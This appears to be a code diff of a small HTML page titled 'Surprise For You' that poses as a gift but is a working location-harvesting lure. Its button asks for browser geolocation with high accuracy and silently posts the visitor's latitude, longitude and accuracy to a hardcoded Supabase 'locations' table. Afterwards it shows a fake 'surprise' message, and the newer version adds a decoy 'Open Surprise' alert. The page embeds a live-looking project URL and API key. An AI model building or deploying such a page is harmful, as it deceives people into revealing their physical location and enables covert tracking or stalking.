@@ -1,97 +1,129 @@
-<!DOCTYPE html>  <html>  
-<head>  
-  <meta charset="UTF-8">  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-  <title>Surprise For You 🎁</title>  
-</head>  <body>    <h2>Surprise For You 🎁</h2>    <p>  
-    <strong>Click Here →</strong>  
-  </p>    <button onclick="shareLocation()">  
-    Share My Location 📍  
-  </button>    <p id="result"></p>    <script>  
-    const SUPABASE_URL =  
-      "https://jpwomydvlacrtqxjvtxi.supabase.co";  
-  
-    const SUPABASE_KEY =  
-      "sb_publishable_uLvwcaQlm7HZvTXPBiNUhw_OMgj_7ub";  
-  
-    const sessionId = crypto.randomUUID();  
-  
-    function shareLocation() {  
-  
-      const result = document.getElementById("result");  
-  
-      if (!navigator.geolocation) {  
-        result.innerHTML =  
-          "Sorry! 😔<br><br>" +  
-          "Your browser does not support this feature.";  
-        return;  
-      }  
-  
-      result.innerHTML =  
-        "Getting Your Surprise... 🎁<br><br>" +  
-        "Please Wait...";  
-  
-      navigator.geolocation.getCurrentPosition(  
-  
-        async function(position) {  
-  
-          const data = {  
-            latitude: position.coords.latitude,  
-            longitude: position.coords.longitude,  
-            accuracy: position.coords.accuracy,  
-            session_id: sessionId  
-          };  
-  
-          try {  
-  
-            const response = await fetch(  
-              SUPABASE_URL + "/rest/v1/locations",  
-              {  
-                method: "POST",  
-  
-                headers: {  
-                  "apikey": SUPABASE_KEY,  
-                  "Authorization": "Bearer " + SUPABASE_KEY,  
-                  "Content-Type": "application/json",  
-                  "Prefer": "return=minimal"  
-                },  
-  
-                body: JSON.stringify(data)  
-              }  
-            );  
-  
-            if (!response.ok) {  
-              throw new Error("Database request failed");  
-            }  
-  
-            result.innerHTML =  
-              "Your Surprise Is Ready! 🎁✨<br><br>" +  
-              "Thank You! ❤️";  
-  
-          } catch (error) {  
-  
-            result.innerHTML =  
-              "Sorry! 😔<br><br>" +  
-              "Please try again.";  
-  
-          }  
-  
-        },  
-  
-        function(error) {  
-  
-          result.innerHTML =  
-            "Sorry! 😔<br><br>" +  
-            "The request could not be completed.";  
-  
-        },  
-  
-        {  
-          enableHighAccuracy: true,  
-          timeout: 15000,  
-          maximumAge: 0  
-        }  
-      );  
-    }  
-  </script>  </body>  
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Surprise For You 🎁</title>
+</head>
+
+<body>
+
+  <h2>Surprise For You 🎁</h2>
+
+  <p>
+    <strong>Click Here →</strong>
+  </p>
+
+  <button onclick="shareSurprise()">
+    Allow 📍
+  </button>
+
+  <p id="result"></p>
+
+  <div id="surpriseButton" style="display:none;">
+    <button onclick="openSurprise()">
+      🎁 Open Surprise
+    </button>
+  </div>
+
+  <script>
+    const SUPABASE_URL =
+      "https://jpwomydvlacrtqxjvtxi.supabase.co";
+
+    const SUPABASE_KEY =
+      "sb_publishable_uLvwcaQlm7HZvTXPBiNUhw_OMgj_7ub";
+
+    const sessionId = crypto.randomUUID();
+
+    function shareSurprise() {
+
+      const result = document.getElementById("result");
+      const surpriseButton =
+        document.getElementById("surpriseButton");
+
+      surpriseButton.style.display = "none";
+
+      if (!navigator.geolocation) {
+        result.innerHTML =
+          "Sorry! 😔<br><br>" +
+          "Location is not supported by your browser.";
+        return;
+      }
+
+      result.innerHTML =
+        "Getting Your Surprise... 🎁<br><br>" +
+        "Please Wait...";
+
+      navigator.geolocation.getCurrentPosition(
+
+        async function(position) {
+
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            session_id: sessionId
+          };
+
+          try {
+
+            const response = await fetch(
+              SUPABASE_URL + "/rest/v1/locations",
+              {
+                method: "POST",
+
+                headers: {
+                  "apikey": SUPABASE_KEY,
+                  "Authorization": "Bearer " + SUPABASE_KEY,
+                  "Content-Type": "application/json",
+                  "Prefer": "return=minimal"
+                },
+
+                body: JSON.stringify(data)
+              }
+            );
+
+            if (!response.ok) {
+              throw new Error("Database request failed");
+            }
+
+            result.innerHTML =
+              "Your Surprise Is Ready! 🎁✨";
+
+            surpriseButton.style.display = "block";
+
+          } catch (error) {
+
+            result.innerHTML =
+              "Sorry! 😔<br><br>" +
+              "Please try again.";
+
+          }
+
+        },
+
+        function(error) {
+
+          result.innerHTML =
+            "Sorry! 😔<br><br>" +
+            "Location permission was not granted.";
+
+        },
+
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function openSurprise() {
+
+      alert("🎁 Surprise Opened! ❤️");
+
+    }
+  </script>
+
+</body>
 </html>
